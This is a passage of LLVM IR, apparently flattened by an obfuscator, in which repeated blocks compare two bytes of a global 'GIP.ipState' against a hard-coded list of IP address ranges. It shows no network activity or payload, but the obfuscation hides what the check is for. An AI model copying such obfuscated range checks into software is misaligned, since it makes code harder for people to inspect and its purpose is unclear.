  %440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 203
  %443 = select i1 %442, i32 -520989690, i32 -110825550
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 59
  %448 = select i1 %447, i32 -1813357520, i32 -110825550
  store i32 %448, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %451 = zext i8 %450 to i32
  %452 = icmp eq i32 %451, 204
  %453 = select i1 %452, i32 161238580, i32 -1234024120
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp eq i32 %456, 34
  %458 = select i1 %457, i32 -1813357520, i32 -1234024120
  store i32 %458, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 207
  %463 = select i1 %462, i32 1599269389, i32 2025280698
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 30
  %468 = select i1 %467, i32 -1813357520, i32 2025280698
  store i32 %468, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %471 = zext i8 %470 to i32
  %472 = icmp eq i32 %471, 117
  %473 = select i1 %472, i32 -330572017, i32 1402995184
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 55
  %478 = select i1 %477, i32 -1813357520, i32 1402995184
  store i32 %478, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %481 = zext i8 %480 to i32
  %482 = icmp eq i32 %481, 117
  %483 = select i1 %482, i32 1469042156, i32 -1655201006
  store i32 %483, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 56
  %488 = select i1 %487, i32 -1813357520, i32 -1655201006
  store i32 %488, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %491 = zext i8 %490 to i32
  %492 = icmp eq i32 %491, 80
  %493 = select i1 %492, i32 -749912661, i32 1015402428
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 235
  %498 = select i1 %497, i32 -1813357520, i32 1015402428
  store i32 %498, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  %500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %501 = zext i8 %500 to i32
  %502 = icmp eq i32 %501, 207
  %503 = select i1 %502, i32 891030878, i32 801873504
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 120
  %508 = select i1 %507, i32 -1813357520, i32 801873504
  store i32 %508, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %511 = zext i8 %510 to i32
  %512 = icmp eq i32 %511, 209
  %513 = select i1 %512, i32 1260455621, i32 692133402
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %516 = zext i8 %515 to i32
  %517 = icmp eq i32 %516, 35
  %518 = select i1 %517, i32 -1813357520, i32 692133402
  store i32 %518, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 64
  %523 = select i1 %522, i32 851821390, i32 478360992
  store i32 %523, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 70
  %528 = select i1 %527, i32 -1813357520, i32 478360992
  store i32 %528, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %531 = zext i8 %530 to i32
  %532 = icmp eq i32 %531, 172
  %533 = select i1 %532, i32 -104044229, i32 826861863
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp sge i32 %536, 16
  %538 = select i1 %537, i32 252498770, i32 826861863
  store i32 %538, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %541, 32
  %543 = select i1 %542, i32 -1813357520, i32 826861863
  store i32 %543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %546 = zext i8 %545 to i32
  %547 = icmp eq i32 %546, 100
  %548 = select i1 %547, i32 -2014930377, i32 -551178380
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %551 = zext i8 %550 to i32
  %552 = icmp sge i32 %551, 64
  %553 = select i1 %552, i32 -1909217886, i32 -551178380
  store i32 %553, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp slt i32 %556, 127
  %558 = select i1 %557, i32 -1813357520, i32 -551178380
  store i32 %558, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %561 = zext i8 %560 to i32
  %562 = icmp eq i32 %561, 169
  %563 = select i1 %562, i32 -1194758572, i32 1156520461
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %566 = zext i8 %565 to i32
  %567 = icmp eq i32 %566, 254
  %568 = select i1 %567, i32 -1813357520, i32 1156520461
  store i32 %568, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %571 = zext i8 %570 to i32
  %572 = icmp eq i32 %571, 198
  %573 = select i1 %572, i32 1800474659, i32 -2104329463
  store i32 %573, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %576 = zext i8 %575 to i32
  %577 = icmp sge i32 %576, 18
  %578 = select i1 %577, i32 2033023949, i32 -2104329463
  store i32 %578, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %581 = zext i8 %580 to i32
  %582 = icmp slt i32 %581, 20
  %583 = select i1 %582, i32 -1813357520, i32 -2104329463
  store i32 %583, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  %585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %586 = zext i8 %585 to i32
  %587 = icmp eq i32 %586, 64
  %588 = select i1 %587, i32 1297748714, i32 -1596338059
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %591 = zext i8 %590 to i32
  %592 = icmp sge i32 %591, 69
  %593 = select i1 %592, i32 1513714095, i32 -1596338059
  store i32 %593, i32* %switchVar
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp slt i32 %596, 227
  %598 = select i1 %597, i32 -1813357520, i32 -1596338059
  store i32 %598, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %601 = zext i8 %600 to i32
  %602 = icmp eq i32 %601, 128
  %603 = select i1 %602, i32 -1702591242, i32 -1660384935
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %606 = zext i8 %605 to i32
  %607 = icmp sge i32 %606, 35
  %608 = select i1 %607, i32 1958689371, i32 -1660384935
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  %610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %611 = zext i8 %610 to i32
  %612 = icmp slt i32 %611, 237
  %613 = select i1 %612, i32 -1813357520, i32 -1660384935
  store i32 %613, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %616 = zext i8 %615 to i32
  %617 = icmp eq i32 %616, 129
  %618 = select i1 %617, i32 -2974131, i32 2098146280
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %621 = zext i8 %620 to i32
  %622 = icmp sge i32 %621, 22
  %623 = select i1 %622, i32 280339978, i32 2098146280
  store i32 %623, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %626 = zext i8 %625 to i32
  %627 = icmp slt i32 %626, 255
  %628 = select i1 %627, i32 -1813357520, i32 2098146280
  store i32 %628, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  %630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %631 = zext i8 %630 to i32
  %632 = icmp eq i32 %631, 130
  %633 = select i1 %632, i32 -20665965, i32 488051728
  store i32 %633, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %636 = zext i8 %635 to i32
  %637 = icmp sge i32 %636, 40
  %638 = select i1 %637, i32 -366888452, i32 488051728
  store i32 %638, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %641 = zext i8 %640 to i32
  %642 = icmp slt i32 %641, 168
  %643 = select i1 %642, i32 -1813357520, i32 488051728
  store i32 %643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  %645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %646 = zext i8 %645 to i32
  %647 = icmp eq i32 %646, 131
  %648 = select i1 %647, i32 -1889275547, i32 -424809491
  store i32 %648, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  %650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %651 = zext i8 %650 to i32
  %652 = icmp sge i32 %651, 3
  %653 = select i1 %652, i32 1209133015, i32 -424809491
  store i32 %653, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp slt i32 %656, 251
  %658 = select i1 %657, i32 -1813357520, i32 -424809491
  store i32 %658, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:659:                                    ; preds = %loopEntry
  %660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %661 = zext i8 %660 to i32
  %662 = icmp eq i32 %661, 132
  %663 = select i1 %662, i32 1379222223, i32 1518259211
  store i32 %663, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %666 = zext i8 %665 to i32
  %667 = icmp sge i32 %666, 3
  %668 = select i1 %667, i32 -752522440, i32 1518259211
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %671 = zext i8 %670 to i32
  %672 = icmp slt i32 %671, 251
  %673 = select i1 %672, i32 -1813357520, i32 1518259211
  store i32 %673, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  %675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %676 = zext i8 %675 to i32
  %677 = icmp eq i32 %676, 134
  %678 = select i1 %677, i32 -39553703, i32 -1715009964
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  %680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %681 = zext i8 %680 to i32
  %682 = icmp sge i32 %681, 5
  %683 = select i1 %682, i32 -1348598965, i32 -1715009964
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %686 = zext i8 %685 to i32
  %687 = icmp slt i32 %686, 235
  %688 = select i1 %687, i32 -1813357520, i32 -1715009964
  store i32 %688, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:689:                                    ; preds = %loopEntry
  %690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %691 = zext i8 %690 to i32
  %692 = icmp eq i32 %691, 136
  %693 = select i1 %692, i32 1458312448, i32 1995796683
  store i32 %693, i32* %switchVar
  br label %loopEnd

; <label>:694:                                    ; preds = %loopEntry
  %695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %696 = zext i8 %695 to i32
  %697 = icmp sge i32 %696, 177
  %698 = select i1 %697, i32 1117631989, i32 1995796683
  store i32 %698, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %701 = zext i8 %700 to i32
  %702 = icmp slt i32 %701, 223
  %703 = select i1 %702, i32 -1813357520, i32 1995796683
  store i32 %703, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %706 = zext i8 %705 to i32
  %707 = icmp eq i32 %706, 138
  %708 = select i1 %707, i32 1713895382, i32 1792560133
  store i32 %708, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %711 = zext i8 %710 to i32
  %712 = icmp sge i32 %711, 13
  %713 = select i1 %712, i32 -598350429, i32 1792560133
  store i32 %713, i32* %switchVar
  br label %loopEnd

; <label>:714:                                    ; preds = %loopEntry
  %715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %716 = zext i8 %715 to i32
  %717 = icmp slt i32 %716, 194
  %718 = select i1 %717, i32 -1813357520, i32 1792560133
  store i32 %718, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:719:                                    ; preds = %loopEntry
  %720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %721 = zext i8 %720 to i32
  %722 = icmp eq i32 %721, 139
  %723 = select i1 %722, i32 1744172313, i32 644967385
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %726 = zext i8 %725 to i32
  %727 = icmp sge i32 %726, 31
  %728 = select i1 %727, i32 -625235488, i32 644967385
  store i32 %728, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  %730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %731 = zext i8 %730 to i32
  %732 = icmp slt i32 %731, 143
  %733 = select i1 %732, i32 -1813357520, i32 644967385
  store i32 %733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 140
  %738 = select i1 %737, i32 901636902, i32 393472850
  store i32 %738, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  %740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %741 = zext i8 %740 to i32
  %742 = icmp sge i32 %741, 1
  %743 = select i1 %742, i32 1146635507, i32 393472850
  store i32 %743, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  %745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %746 = zext i8 %745 to i32
  %747 = icmp slt i32 %746, 203
  %748 = select i1 %747, i32 -1813357520, i32 393472850
  store i32 %748, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:749:                                    ; preds = %loopEntry
  %750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %751 = zext i8 %750 to i32
  %752 = icmp eq i32 %751, 143
  %753 = select i1 %752, i32 238641228, i32 -185663452
  store i32 %753, i32* %switchVar
  br label %loopEnd

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %756 = zext i8 %755 to i32
  %757 = icmp sge i32 %756, 45
  %758 = select i1 %757, i32 -284442623, i32 -185663452
  store i32 %758, i32* %switchVar
  br label %loopEnd

; <label>:759:                                    ; preds = %loopEntry
  %760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %761 = zext i8 %760 to i32
  %762 = icmp slt i32 %761, 233
  %763 = select i1 %762, i32 -1813357520, i32 -185663452
  store i32 %763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %766 = zext i8 %765 to i32
  %767 = icmp eq i32 %766, 144
  %768 = select i1 %767, i32 1121490258, i32 1482701350
  store i32 %768, i32* %switchVar
  br label %loopEnd

; <label>:769:                                    ; preds = %loopEntry
  %770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %771 = zext i8 %770 to i32
  %772 = icmp sge i32 %771, 99
  %773 = select i1 %772, i32 -1389943194, i32 1482701350
  store i32 %773, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %776 = zext i8 %775 to i32
  %777 = icmp slt i32 %776, 253
  %778 = select i1 %777, i32 -1813357520, i32 1482701350
  store i32 %778, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  %780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %781 = zext i8 %780 to i32
  %782 = icmp eq i32 %781, 146
  %783 = select i1 %782, i32 1158863663, i32 -503735345
  store i32 %783, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  %785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %786 = zext i8 %785 to i32
  %787 = icmp sge i32 %786, 165
  %788 = select i1 %787, i32 -869764894, i32 -503735345
  store i32 %788, i32* %switchVar
  br label %loopEnd

; <label>:789:                                    ; preds = %loopEntry
  %790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %791 = zext i8 %790 to i32
  %792 = icmp slt i32 %791, 166
  %793 = select i1 %792, i32 -1813357520, i32 -503735345
  store i32 %793, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:794:                                    ; preds = %loopEntry
  %795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %796 = zext i8 %795 to i32
  %797 = icmp eq i32 %796, 147
  %798 = select i1 %797, i32 -93949335, i32 -907899977
  store i32 %798, i32* %switchVar
  br label %loopEnd

; <label>:799:                                    ; preds = %loopEntry
  %800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %801 = zext i8 %800 to i32
  %802 = icmp sge i32 %801, 35
  %803 = select i1 %802, i32 1814096479, i32 -907899977
  store i32 %803, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  %805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %806 = zext i8 %805 to i32
  %807 = icmp slt i32 %806, 43
  %808 = select i1 %807, i32 -1813357520, i32 -907899977
  store i32 %808, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:809:                                    ; preds = %loopEntry
  %810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %811 = zext i8 %810 to i32
  %812 = icmp eq i32 %811, 147
  %813 = select i1 %812, i32 -2005730630, i32 2119661045
  store i32 %813, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp sge i32 %816, 103
  %818 = select i1 %817, i32 797711503, i32 2119661045
  store i32 %818, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %821 = zext i8 %820 to i32
  %822 = icmp slt i32 %821, 105
  %823 = select i1 %822, i32 -1813357520, i32 2119661045
  store i32 %823, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:824:                                    ; preds = %loopEntry
  %825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %826 = zext i8 %825 to i32
  %827 = icmp eq i32 %826, 147
  %828 = select i1 %827, i32 452475251, i32 -339331792
  store i32 %828, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %831 = zext i8 %830 to i32
  %832 = icmp sge i32 %831, 168
  %833 = select i1 %832, i32 1889062720, i32 -339331792
  store i32 %833, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %836 = zext i8 %835 to i32
  %837 = icmp slt i32 %836, 170
  %838 = select i1 %837, i32 -1813357520, i32 -339331792
  store i32 %838, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:839:                                    ; preds = %loopEntry
  %840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %841 = zext i8 %840 to i32
  %842 = icmp eq i32 %841, 147
  %843 = select i1 %842, i32 57699128, i32 -1051678025
  store i32 %843, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  %845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %846 = zext i8 %845 to i32
  %847 = icmp sge i32 %846, 198
  %848 = select i1 %847, i32 1505899833, i32 -1051678025
  store i32 %848, i32* %switchVar
  br label %loopEnd

; <label>:849:                                    ; preds = %loopEntry
  %850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %851 = zext i8 %850 to i32
  %852 = icmp slt i32 %851, 200
  %853 = select i1 %852, i32 -1813357520, i32 -1051678025
  store i32 %853, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:854:                                    ; preds = %loopEntry
